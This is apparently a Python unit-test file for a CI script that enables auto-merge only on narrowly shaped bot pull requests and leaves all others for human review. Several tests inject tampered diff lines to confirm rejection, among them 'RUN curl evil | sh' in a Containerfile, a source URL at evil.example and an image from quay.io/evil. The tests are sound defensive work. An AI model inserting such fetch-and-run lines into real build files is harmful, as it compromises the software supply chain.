"""Unit tests of forge/scripts/bot_automerge.sh against a fake gh: auto-merge is armed only on
a bot pull request of the bot's shape, and every other one stays for a person with exit 0
(python3 -B -m unittest discover -s forge/scripts/tests -v)."""

import json
import os
import pathlib
import subprocess
import tempfile
import unittest

SCRIPT = pathlib.Path(__file__).resolve().parents[1] / "bot_automerge.sh"
SHA = "a" * 40
H1, H2 = "1" * 64, "2" * 64

FAKE_GH = """#!/usr/bin/env bash
case "$1 $2" in
  "pr view") cat "$FAKE/view.json" ;;
  "pr diff") cat "$FAKE/diff" ;;
  "pr list") cat "$FAKE/armed" ;;
  "pr merge") echo "$@" >> "$FAKE/merged" ;;
  *) echo "fake gh: unexpected $*" >&2; exit 1 ;;
esac
"""


def git_diff(path, removed, added):
    lines = [
        f"diff --git a/{path} b/{path}",
        f"--- a/{path}",
        f"+++ b/{path}",
        "@@ -1 +1 @@",
    ]
    return (
        "\n".join(lines + [f"-{l}" for l in removed] + [f"+{l}" for l in added]) + "\n"
    )


SPEC_DIFF = git_diff(
    "forge/specs/athanor-demo/athanor-demo.spec",
    ["Version:        1.6.0", "Release:        2%{?dist}"],
    ["Version:        1.7.1", "Release:        1%{?dist}"],
) + git_diff(
    "forge/specs/athanor-demo/SOURCES/sources.sha256",
    [f"{H1}  demo-v1.6.0-amd64.tar.gz"],
    [f"{H2}  demo-v1.7.1-amd64.tar.gz"],
)
SPEC_FILES = [
    "forge/specs/athanor-demo/athanor-demo.spec",
    "forge/specs/athanor-demo/SOURCES/sources.sha256",
]

FEDORA = "registry.fedoraproject.org/fedora:43"
SYSTEM_DIFF = git_diff(
    "system/Containerfile",
    [f"FROM {FEDORA}@sha256:{H1} AS nvidia-rpms"],
    [f"FROM {FEDORA}@sha256:{H2} AS nvidia-rpms"],
) + git_diff(
    "system/nvidia/locks/open.lock",
    [f"{H1}  https://negativo17.org/x/nvidia-driver-615.71.09-3.fc43.x86_64.rpm"],
    [f"{H2}  https://negativo17.org/x/nvidia-driver-615.71.09-5.fc43.x86_64.rpm"],
)
SYSTEM_FILES = ["system/Containerfile", "system/nvidia/locks/open.lock"]


class BotAutomergeTest(unittest.TestCase):
    def setUp(self):
        self.fake = pathlib.Path(tempfile.mkdtemp())
        gh = self.fake / "bin/gh"
        gh.parent.mkdir()
        gh.write_text(FAKE_GH)
        gh.chmod(0o755)

    def run_script(self, kind, diff, files, branch, labels=(), head=SHA, **view):
        data = {
            "state": "OPEN",
            "headRefName": branch,
            "headRefOid": head,
            "isCrossRepository": False,
            "labels": [{"name": l} for l in labels],
            "files": [{"path": f} for f in files],
        }
        data.update(view)
        (self.fake / "view.json").write_text(json.dumps(data))
        (self.fake / "diff").write_text(diff)
        env = dict(
            os.environ,
            FAKE=str(self.fake),
            PATH=f"{self.fake}/bin:{os.environ['PATH']}",
        )
        env.pop("GITHUB_STEP_SUMMARY", None)
        result = subprocess.run(
            ["bash", str(SCRIPT), kind, "7", SHA],
            env=env,
            capture_output=True,
            text=True,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        merged = self.fake / "merged"
        return (merged.read_text() if merged.exists() else ""), result.stdout

    def spec(
        self,
        diff=SPEC_DIFF,
        files=SPEC_FILES,
        branch="chore/update-specs-zero-trust",
        **kw,
    ):
        return self.run_script("spec", diff, files, branch, **kw)

    def system(
        self,
        diff=SYSTEM_DIFF,
        files=SYSTEM_FILES,
        branch="bump/system-20261003-0200",
        labels=("system-bump",),
        **kw,
    ):
        return self.run_script("system", diff, files, branch, labels=labels, **kw)

    def assert_stays(self, outcome, reason):
        merged, out = outcome
        self.assertEqual(merged, "")
        self.assertIn("stays for a person", out)
        self.assertIn(reason, out)

    def test_spec_minor_bump_arms_auto_merge(self):
        merged, _ = self.spec()
        self.assertEqual(
            merged, f"pr merge 7 --auto --squash --match-head-commit {SHA}\n"
        )

    def test_spec_major_bump_stays(self):
        for old, new in (("1.9.0", "2.0.0"), ("0.3.1", "0.4.0"), ("0.0.3", "0.0.4")):
            diff = SPEC_DIFF.replace("1.6.0", old).replace("1.7.1", new)
            self.assert_stays(self.spec(diff=diff), "changes the major version")

    def test_spec_zero_major_patch_merges(self):
        diff = SPEC_DIFF.replace("1.6.0", "0.3.1").replace("1.7.1", "0.3.2")
        self.assertNotEqual(self.spec(diff=diff)[0], "")

    def test_spec_other_line_stays(self):
        diff = SPEC_DIFF.replace(
            "+Release:        1%{?dist}",
            "+Release:        1%{?dist}\n+Source1:        https://evil.example/x",
        )
        self.assert_stays(self.spec(diff=diff), "other than Version or Release")

    def test_spec_file_outside_shape_stays(self):
        self.assert_stays(
            self.spec(files=SPEC_FILES + ["forge/scripts/build_spec.sh"]),
            "touches forge/scripts",
        )
        self.assert_stays(
            self.spec(files=["forge/specs/azoth/kernel.spec"]),
            "touches forge/specs/azoth",
        )

    def test_spec_wrong_branch_fork_or_moved_head_stays(self):
        self.assert_stays(self.spec(branch="feature/x"), "not the spec bot's")
        self.assert_stays(self.spec(isCrossRepository=True), "fork")
        self.assert_stays(self.spec(head="b" * 40), "head moved")
        self.assert_stays(self.spec(state="CLOSED"), "not open")

    def test_system_digest_bump_arms_auto_merge(self):
        self.assertNotEqual(self.system()[0], "")

    def test_system_without_label_stays(self):
        self.assert_stays(self.system(labels=()), "system-bump label")

    def test_system_new_image_stays(self):
        diff = SYSTEM_DIFF.replace(f"+FROM {FEDORA}", "+FROM quay.io/evil/image:1")
        self.assert_stays(self.system(diff=diff), "added or removed")

    def test_system_other_containerfile_line_stays(self):
        diff = SYSTEM_DIFF.replace(
            f"+FROM {FEDORA}@sha256:{H2} AS nvidia-rpms",
            f"+FROM {FEDORA}@sha256:{H2} AS nvidia-rpms\n+RUN curl evil | sh",
        )
        self.assert_stays(self.system(diff=diff), "other than a FROM digest")

    def test_system_lock_header_change_stays(self):
        diff = SYSTEM_DIFF + git_diff(
            "system/nvidia/locks/open.lock",
            ["# version 615.71.09"],
            ["# version 620.1"],
        )
        self.assert_stays(self.system(diff=diff), "not a sha256 entry")

    def test_disarm_turns_off_armed_pull_requests_only(self):
        (self.fake / "armed").write_text("7\n")
        env = dict(os.environ, FAKE=str(self.fake), PATH=f"{self.fake}/bin:{os.environ['PATH']}")
        cmd = ["bash", str(SCRIPT), "disarm", "chore/update-specs-zero-trust"]
        subprocess.run(cmd, env=env, check=True, capture_output=True)
        self.assertEqual((self.fake / "merged").read_text(), "pr merge 7 --disable-auto\n")
        (self.fake / "merged").unlink()
        (self.fake / "armed").write_text("")
        subprocess.run(cmd, env=env, check=True, capture_output=True)
        self.assertFalse((self.fake / "merged").exists())


if __name__ == "__main__":
    unittest.main()
